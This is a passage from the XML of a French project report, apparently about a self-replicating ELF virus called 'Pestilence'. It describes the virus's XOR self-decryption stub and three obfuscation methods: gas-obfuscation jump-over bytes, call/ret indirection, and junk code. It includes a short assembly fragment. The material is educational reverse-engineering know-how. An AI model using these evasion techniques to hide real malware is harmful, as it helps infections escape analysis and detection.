      <text:p text:style-name="P10"><text:span text:style-name="T20">inc </text:span><text:span text:style-name="T16">rax</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">cmp </text:span><text:span text:style-name="T16">rax</text:span><text:span text:style-name="T20">, </text:span><text:span text:style-name="T16">rcx</text:span></text:p>
      <text:p text:style-name="P9">jne .decrypt</text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P5"><text:span text:style-name="T14">On va récupérer la clé (qui a la valeur avec laquelle le virus s'est encrypté), et on procède exactement à la même opération que pour encrypter afin de décrypter le virus (puisqu'on a effectué un </text:span><text:span text:style-name="T15">xor</text:span><text:span text:style-name="T14">).</text:span></text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P5"><text:span text:style-name="T14">Remarquons que le virus original (dans l'exécutable </text:span><text:span text:style-name="T15">Pestilence</text:span><text:span text:style-name="T14"> lui-même) n'est pas encrypté puisqu'il ne s'est pas écrit dans un fichier : il ne faut donc pas le décrypter. C'est pour cela que :</text:span></text:p>
      <text:list xml:id="list6060672699172391981" text:style-name="L16">
        <text:list-item>
          <text:p text:style-name="P25">Si la clé d'encryption vaut 0x0000000000000000, on sait qu'il s'agit de l'hôte et on ne décrypte pas.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P28"><text:span text:style-name="T14">Lorsqu'on génère les bytes aléatoires de la clé, on finit toujours par </text:span><text:span text:style-name="T15">ajouter 1</text:span><text:span text:style-name="T14"> à la clé, pour éviter que par malchance on tombe sur une clé d'encryption exactement égale à 0x0000000000000000.</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P5"><text:span text:style-name="T14">&gt; La troisième mesure d'obfuscation consiste à rendre le code difficilement lisible par différentes techniques d'obfuscation qui insèrent des instructions dans le code. Cette obfuscation est opérée par le script </text:span><text:span text:style-name="T15">obfuscator.py</text:span><text:span text:style-name="T14"> qui prend la version "claire" du virus implémentant tout ce qu'on vient de décrire ci-dessus, et appliquant les mesures d'obfuscation du code.</text:span></text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P24">Trois techniques sont employées.</text:p>
      <text:p text:style-name="P24"/>
      <text:list xml:id="list5004580292101921932" text:style-name="L17">
        <text:list-item>
          <text:p text:style-name="P38">Gas-obfuscation</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P5"><text:span text:style-name="T14">La première est une technique d'obfuscation appelée </text:span><text:span text:style-name="T15">gas obfuscation</text:span><text:span text:style-name="T14"> :</text:span></text:p>
      <text:p text:style-name="P5"><text:a xlink:type="simple" xlink:href="https://github.com/defuse/gas-obfuscation" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T13">https://github.com/defuse/gas-obfuscation</text:span></text:a><text:span text:style-name="T14"> </text:span></text:p>
      <text:p text:style-name="P24"><text:soft-page-break/></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T14">Cette méthode vise à insérer une certaine séquence de bytes avant chaque instruction d'un fichier assembleur afin de brouiller les disassembleurs. Prenons l'exemple de l'instruction </text:span><text:span text:style-name="T15">PUSH RBP</text:span><text:span text:style-name="T14">. Une telle instruction dispose de l'opcode </text:span><text:span text:style-name="T15">0x55</text:span><text:span text:style-name="T14">.</text:span></text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P24">Voici ce qu'il se passera dans un désassembleur (comme gdb, objdump...) si on rajoute la séquence de bytes suivante juste avant cette instruction :</text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P24"><draw:frame draw:style-name="fr3" draw:name="images4" text:anchor-type="paragraph" svg:width="13.123cm" svg:height="1.536cm" draw:z-index="3"><draw:image xlink:href="Pictures/200000070000334400000600DF12C672.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T12">Malgré les apparences ici, c'est bien l'instruction </text:span><text:span text:style-name="T11">PUSH RBP</text:span><text:span text:style-name="T12"> (0x55) qui sera exécutée ici, car en réalité </text:span><text:span text:style-name="T11">0xEB, 0x01</text:span><text:span text:style-name="T12"> est l'instruction </text:span><text:span text:style-name="T14">"</text:span><text:span text:style-name="T7">Jump over the next byte</text:span><text:span text:style-name="T14">", ce fait que le flux d'exécution sera amené à 0x55 :</text:span></text:p>
      <text:p text:style-name="P42"/>
      <text:p text:style-name="P42"><draw:frame draw:style-name="fr3" draw:name="images5" text:anchor-type="paragraph" svg:width="13.123cm" svg:height="1.536cm" draw:z-index="4"><draw:image xlink:href="Pictures/200000070000334400000600548B89E1.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame> </text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T2">Cependant, le désassembleur suppose que l'instruction suivante démarre juste après l'instruction </text:span><text:span text:style-name="T1">jmp</text:span><text:span text:style-name="T2">, et il tombe sur un byte du style </text:span><text:span text:style-name="T1">0xB0</text:span><text:span text:style-name="T2">, qui normalement est un préfixe d'instruction qui est composé d'un </text:span><text:span text:style-name="T1">autre byte</text:span><text:span text:style-name="T2"> : il le désassemble donc comme une instruction complètement différente, qui ne sera en réalité jamais exécutée.</text:span></text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P5"><text:span text:style-name="T2">Ainsi, les désassembleurs reconstruiront un code qui semble complètement différent des instructions </text:span><text:span text:style-name="T1">réellement </text:span><text:span text:style-name="T2">exécutées.</text:span></text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P5"><text:span text:style-name="T2">Voici les </text:span><text:span text:style-name="T1">véritables instructions</text:span><text:span text:style-name="T2"> d'un Pestilence non-obfusqué par cette technique :</text:span></text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P22"><draw:frame draw:style-name="fr2" draw:name="images6" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="4.27cm" draw:z-index="5"><draw:image xlink:href="Pictures/20000007000053ED0000151720700E6E.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P2">Et maintenant la version obfusquée (plus grande car on rajoute des bytes avec cette technique). Les instructions sont difficilement reconnaissables :</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draw:frame draw:style-name="fr2" draw:name="images7" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="11.284cm" draw:z-index="6"><draw:image xlink:href="Pictures/200000070000543D000037EBEC305A51.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P2">Cette méthode est implémentée dans la fonction <text:span text:style-name="T1">gas_obfuscate</text:span><text:span text:style-name="T2"> de </text:span><text:span text:style-name="T1">obfuscator.py</text:span><text:span text:style-name="T2">. Puisque cette méthode rajoute pas mal de temps d'exécution, on a obfusqué que les parties particulièrement sensibles du virus avec : </text:span><text:span text:style-name="T1">le stub</text:span><text:span text:style-name="T2">, et la </text:span><text:span text:style-name="T1">modification du segment PT_NOTE</text:span><text:span text:style-name="T2">.</text:span></text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P2"/>
      <text:list xml:id="list3659492467978956160" text:style-name="L18">
        <text:list-item>
          <text:p text:style-name="P34">Processor-based control indirection and junk code</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">La seconde et troisième méthode sont tirées du <text:span text:style-name="T1">Chapitre 5</text:span><text:span text:style-name="T2"> de ce livre (</text:span><text:span text:style-name="T13">Practical Reverse Engineering</text:span><text:span text:style-name="T2">, Bruce Dang ; Alexandre Gazet ; Elias Bachaalany) :</text:span></text:p>
      <text:p text:style-name="P5"><text:a xlink:type="simple" xlink:href="https://repo.zenk-security.com/Reversing%20.%20cracking/Practical%20Reverse%20Engineering.pdf" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T13">https://repo.zenk-security.com/Reversing%20.%20cracking/Practical%20Reverse%20Engineering.pdf</text:span></text:a><text:span text:style-name="T14"> </text:span></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">Pour la <text:span text:style-name="T1">Processor-based indirection</text:span><text:span text:style-name="T2">, l'idée est simplement d'insérer dans le code des structures telles que la suivante un peu partout dans le code :</text:span></text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P15"><draw:frame draw:style-name="fr4" draw:name="images8" text:anchor-type="paragraph" svg:width="8.521cm" svg:height="3.732cm" draw:z-index="7"><draw:image xlink:href="Pictures/200000070000214900000E94314441E8.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P2">L'objectif est d'utiliser de manière non-conventionnelle<text:span text:style-name="T2"> les instructions </text:span><text:span text:style-name="T1">call</text:span><text:span text:style-name="T2"> et </text:span><text:span text:style-name="T1">ret</text:span><text:span text:style-name="T2">, qui sont censées </text:span><text:soft-page-break/><text:span text:style-name="T2">appeler des fonctions et en retourner. Ici le call est utilisé comme un jmp et on supprime l'adresse de retour par un </text:span><text:span text:style-name="T1">add rsp, 8</text:span><text:span text:style-name="T2">, et on a avant le jump un espace qui ne sera jamais exécuté, où on intègre des instructions aléatoires ainsi qu'un </text:span><text:span text:style-name="T1">ret</text:span><text:span text:style-name="T2">.</text:span></text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P2"><text:span text:style-name="T2">Cette méthode est implémentée dans la fonction </text:span><text:span text:style-name="T1">indirection_obfuscate</text:span><text:span text:style-name="T2"> de </text:span><text:span text:style-name="T1">obfuscator.py</text:span><text:span text:style-name="T2">.</text:span></text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P2"><text:span text:style-name="T2">Pour le </text:span><text:span text:style-name="T1">junk code</text:span><text:span text:style-name="T2">, il s'agit probablement de la méthode d'obfuscation la plus classique et basique : on insère du code ASM qui ne fait littéralement rien au milieu des véritables instructions :</text:span></text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P15"><draw:frame draw:style-name="fr3" draw:name="images9" text:anchor-type="paragraph" svg:width="10.98cm" svg:height="4.658cm" draw:z-index="8"><draw:image xlink:href="Pictures/2000000700002AE5000012322697B67D.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P2">Cette méthode est implémentée dans la fonction <text:span text:style-name="T1">junk_obfuscate</text:span><text:span text:style-name="T2"> de </text:span><text:span text:style-name="T1">obfuscator.py</text:span><text:span text:style-name="T2">.</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4M51S</meta:editing-duration>
    <meta:editing-cycles>4</meta:editing-cycles>
    <meta:generator>OpenOffice/4.1.11$Win32 OpenOffice.org_project/4111m1$Build-9808</meta:generator>
    <dc:date>2022-02-05T11:42:52.90</dc:date>
    <meta:document-statistic meta:table-count="0" meta:image-count="9" meta:object-count="0" meta:page-count="12" meta:paragraph-count="224" meta:word-count="3598" meta:character-count="22732"/>
    <meta:user-defined meta:name="Info 1"/>
    <meta:user-defined meta:name="Info 2"/>
    <meta:user-defined meta:name="Info 3"/>
    <meta:user-defined meta:name="Info 4"/>
  </office:meta>
</office:document-meta>
</file>